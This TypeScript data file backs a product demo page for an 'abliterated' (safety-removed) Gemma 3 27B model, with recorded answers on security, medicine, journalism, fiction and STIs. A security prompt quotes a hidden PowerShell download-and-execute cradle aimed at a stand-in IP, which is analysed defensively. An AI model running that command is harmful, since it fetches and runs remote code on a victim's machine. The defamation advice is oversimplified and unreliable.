/* "Unfiltered models, your rules" (Orazaka product page, /products/orazaka/demos#unfiltered): structure and records
   only — the words around them are messages (site.orazakaUnfiltered).

   The exchanges are records, kept in the language they were typed in (like the image prompts of DEMO_GALLERY): the
   question Eric sent and the answer the real Orazaka streamed back, on one Mac, through the edge (:8088) and the full
   interceptor pipeline, with `mdq100/Gemma3-Instruct-Abliterated:27b` served as the catalogue's chat model
   (krizaka/orazaka infra/migrations/2026-10-11-uncensored-models.sql). Answers are verbatim; `[…]` marks a cut — the
   closing "next step" line Eric's profile asks for, or an inexact line (the malware case dropped "DNS requests for an
   IP address"). Recorded 2026-10-11; conversation ids kept for the trail. The 7–8B unfiltered models were tried on the
   same questions and are not shown: their dosages and STI lists contained errors.

   Hard limits, never here: sexual content involving minors, explicit sexual content, real persons, weapons or
   explosives or bio-chemical procedures, working malware or exploit code, anything that enables serious harm. */

export const UNFILTERED_MODEL = "Gemma 3 27B · abliterated";

export const UNFILTERED_CASES = [
  {
    id: "security",
    icon: "shield",
    conversation: "1c06cda9-bdd4-4c36-9f12-4fd5a8c56bff",
    prompt:
      "I'm on our security team. A phishing attachment ran this on a workstation: powershell -nop -w hidden -enc <base64>, which decodes to IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1'). Explain what each part does, list the indicators of compromise, and say where to hunt for it in our logs.",
    answer: [
      "- `IEX` is an abbreviation for \"Invoke-Expression,\" which is a cmdlet in PowerShell used to interpret and execute a string as a PowerShell command or expression.",
      "- `New-Object` creates a new instance of a specified type. Here, it is used to create a new instance of the `Net.WebClient` class, which is a .NET Framework class for making HTTP requests.",
      "- The `DownloadString` method of the `Net.WebClient` class is used to retrieve the response from a web server, treating the result as a string. In this case, it is used to download the content of the PowerShell script located at the URL `http://203.0.113.7/a.ps1`.",
      "For indicators of compromise, we should look for: […] HTTP requests to `http://203.0.113.7/a.ps1`. Successful execution of a PowerShell script.",
      "In our logs, we should hunt for HTTP requests indicating a request to `http://203.0.113.7/a.ps1`. This will help us identify the source of the request and possibly correlate it with the IP address or the domain name of the server from which the script was downloaded.",
    ],
  },
  {
    id: "clinician",
    icon: "heart",
    conversation: "0227383f-7cb0-4001-8c44-5fe66a368746",
    prompt:
      "I'm an ER nurse. Be frank and precise: the maximum daily acetaminophen dose for a healthy adult and for a patient with chronic heavy alcohol use, and the interaction risk with warfarin.",
    answer: [
      "For a healthy adult, the maximum daily dose of acetaminophen is generally 4,000 mg. However, for a patient with chronic heavy alcohol use, the maximum daily dose should not exceed 2,000 mg to avoid the risk of liver damage. Acetaminophen can interact with warfarin, potentially leading to an increased risk of bleeding. […]",
    ],
  },
  {
    id: "journalist",
    icon: "knowledge",
    conversation: "703dd211-b0a2-47ca-8d11-ac38f6094fc1",
    prompt:
      "I'm a journalist investigating a construction company suspected of bid-rigging on municipal contracts in Quebec. Explain how bid-rigging schemes usually work, which public documents reveal them, and how to word allegations so the article is not defamatory.",
    answer: [
      "Bid-rigging schemes occur when two or more bidders collude to ensure that one of them is awarded a contract, often by submitting non-competitive bids. This can be done by agreeing in advance to bid a certain amount, or by one or more bidders withdrawing their bids.",
      "The public documents that typically reveal such schemes include the tender documents, which specify the criteria for selection, and the minutes of the meetings where the decision to award the contract was made.",
      "To word the allegations so that the article is not defamatory, you can use phrases such as \"It has been alleged that [Company X] and [Company Y] were involved in a bid-rigging scheme,\" […] This approach avoids making a definitive statement about the companies' actions, thus not defaming them until a formal investigation confirms the allegations.",
    ],
  },
  {
    id: "novelist",
    icon: "story",
    conversation: "160f4ba7-5f77-4d64-b82d-ab074b847513",
    prompt:
      "Write a 120-word scene for my crime novel: a detective walks into the aftermath of a violent home invasion at dawn. Dark and visceral, but not gratuitous.",
    answer: [
      "As the first rays of dawn tinge the sky, Detective Eliza Grant steps into the small, cluttered living room, her eyes immediately drawn to the scene of the crime. The morning light filters through the broken window, casting a dim, almost melancholic glow on the torn curtains and scattered furniture. A vase, its contents spilled, lies askew, a testament to the struggle. […] Each detail, from the smudges on the window sill to the displaced ash in the grate, whispers of the violent encounter that had taken place.",
    ],
  },
  {
    id: "health",
    icon: "chat",
    conversation: "3e81766d-e459-496a-be61-f4e22ade0b45",
    prompt: "Frank answer, plain language, no moralising: which STIs can be passed on through oral sex, and does withdrawal protect against any of them?",
    answer: [
      "Some STIs that can be passed on through oral sex include chlamydia, gonorrhea, and herpes. However, withdrawal does not protect against any STIs, as it is a method that prevents pregnancy by keeping the semen from entering the vagina.",
    ],
  },
] as const;

export type UnfilteredCaseId = (typeof UNFILTERED_CASES)[number]["id"];

/** The operator's rule, as a pack declares it (krizaka/orazaka-packs document-validation/pack.yaml — an excerpt, lines as written). */
export const POLICY_SAMPLE = {
  file: "orazaka-packs/document-validation/pack.yaml",
  lang: "yaml",
  code: `regulatoryClass: SENSITIVE
scopeGuard:
  refusedTerms:
    - conseil juridique
    - consultation juridique
    - avocat
    - plaidoirie
    - action en justice
  refusal: >-
    Je contrôle des documents contre un corpus de règles et je cite mes sources. Je ne donne pas
    de conseil juridique et je ne dis pas quelle action engager — pour cela, adressez-vous à un
    professionnel du droit.`,
} as const;
